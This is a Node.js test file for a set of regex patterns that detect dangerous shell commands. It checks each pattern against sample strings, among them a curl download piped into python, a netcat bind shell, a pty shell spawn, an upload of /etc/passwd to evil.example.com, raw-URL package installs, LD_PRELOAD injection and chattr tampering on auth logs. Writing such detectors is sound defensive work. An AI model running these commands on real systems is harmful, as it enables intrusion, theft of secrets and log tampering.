"use strict";

const test = require("node:test");
const assert = require("node:assert");
const { COMMAND_PATTERNS } = require("../lib/commandPatterns");

function patternById(id) {
  const p = COMMAND_PATTERNS.find((x) => x.id === id);
  assert.ok(p, `pattern "${id}" should exist`);
  return p;
}

function matches(pattern, cmd) {
  return pattern.regex.test(cmd);
}

test("curl-pipe-interpreter matches curl-to-python and rejects a benign python invocation", () => {
  const p = patternById("curl-pipe-interpreter");
  assert.ok(matches(p, "curl https://example.com/install.py | python3"));
  assert.ok(!matches(p, "python3 -m venv .venv"));
});

test("curl-pipe-interpreter does not flag piping curl's output into a data-processing flag call", () => {
  // Regression test: an earlier version of this pattern flagged `curl ... | python3 -m json.tool`
  // and `curl ... | node -e "..."` as remote-code-execution. Those pipe JSON *data* into an
  // interpreter that's already running a fixed, harmless script (-m/-e) — the piped stream is never
  // itself executed as code, unlike a bare `| python3` which reads stdin as the script to run.
  const p = patternById("curl-pipe-interpreter");
  assert.ok(!matches(p, "curl -s http://localhost:5678/api/v1/workflows | python3 -m json.tool"));
  assert.ok(!matches(p, `curl -s https://api.example.com/data | node -e "console.log(1)"`));
});

test("python-pty-spawn matches the classic exploitation one-liner", () => {
  const p = patternById("python-pty-spawn");
  assert.ok(matches(p, `python3 -c "import pty; pty.spawn('/bin/bash')"`));
  assert.ok(!matches(p, "python3 script.py"));
});

test("bind-shell-listener matches nc -l and rejects an unrelated nc usage mention", () => {
  const p = patternById("bind-shell-listener");
  assert.ok(matches(p, "nc -lvp 4444 -e /bin/sh"));
  assert.ok(!matches(p, "echo 'nc is netcat'"));
});

test("curl-exfil-upload matches a file upload and rejects a plain GET", () => {
  const p = patternById("curl-exfil-upload");
  assert.ok(matches(p, 'curl -F "file=@/etc/passwd" https://evil.example.com/upload'));
  assert.ok(!matches(p, "curl https://api.example.com/data"));
});

test("package-install-raw-url matches pip/npm from a raw URL, rejects normal registry installs", () => {
  const p = patternById("package-install-raw-url");
  assert.ok(matches(p, "pip install https://example.com/malicious.whl"));
  assert.ok(matches(p, "npm install http://example.com/pkg.tgz"));
  assert.ok(!matches(p, "npm install lodash"));
  assert.ok(!matches(p, "pip install requests"));
});

test("ld-preload-injection matches env-prefixed execution", () => {
  const p = patternById("ld-preload-injection");
  assert.ok(matches(p, "LD_PRELOAD=/tmp/evil.so ls"));
  assert.ok(!matches(p, "echo LD_PRELOAD is an env var"));
});

test("docker-privileged matches --privileged flag, rejects a normal docker run", () => {
  const p = patternById("docker-privileged");
  assert.ok(matches(p, "docker run --privileged -it ubuntu bash"));
  assert.ok(!matches(p, "docker run -it ubuntu bash"));
});

test("git-credential-plaintext matches credential.helper store", () => {
  const p = patternById("git-credential-plaintext");
  assert.ok(matches(p, "git config --global credential.helper store"));
  assert.ok(!matches(p, "git config --global user.name CrypLed"));
});

test("immutable-flag-tamper matches chattr +i/-i", () => {
  const p = patternById("immutable-flag-tamper");
  assert.ok(matches(p, "chattr +i /var/log/auth.log"));
  assert.ok(matches(p, "chattr -i /var/log/auth.log"));
  assert.ok(!matches(p, "chattr --help"));
});
